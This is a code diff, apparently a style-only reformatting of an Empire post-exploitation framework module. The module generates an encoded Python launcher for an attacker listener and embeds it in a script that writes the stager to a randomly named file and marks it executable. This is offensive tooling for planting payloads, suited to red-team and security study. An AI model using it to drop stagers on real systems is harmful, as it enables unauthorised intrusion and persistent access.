@@ -1,7 +1,6 @@
 from __future__ import print_function
 
-from builtins import object
-from builtins import str
+from builtins import object, str
 from typing import Dict
 
 from empire.server.common.module_models import PydanticModule
@@ -9,16 +8,28 @@ from empire.server.common.module_models import PydanticModule
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
+    def generate(
+        main_menu,
+        module: PydanticModule,
+        params: Dict,
+        obfuscate: bool = False,
+        obfuscation_command: str = "",
+    ):
 
         # extract all of our options
-        listenerName = params['Listener']
-        userAgent = params['UserAgent']
-        safeChecks = params['SafeChecks']
+        listenerName = params["Listener"]
+        userAgent = params["UserAgent"]
+        safeChecks = params["SafeChecks"]
         # generate the launcher code
-        launcher = main_menu.stagers.generate_launcher(listenerName, language='python', encode=True, userAgent=userAgent, safeChecks=safeChecks)
+        launcher = main_menu.stagers.generate_launcher(
+            listenerName,
+            language="python",
+            encode=True,
+            userAgent=userAgent,
+            safeChecks=safeChecks,
+        )
         launcher = launcher.replace('"', '\\"')
-        script = '''
+        script = """
 import os
 from random import choice
 from string import ascii_uppercase
@@ -34,6 +45,8 @@ with open(bashlocation, 'w') as f:
     f.write(stager)
     f.close()
 os.chmod(bashlocation, 0755)
-''' % (launcher)
+""" % (
+            launcher
+        )
 
         return script
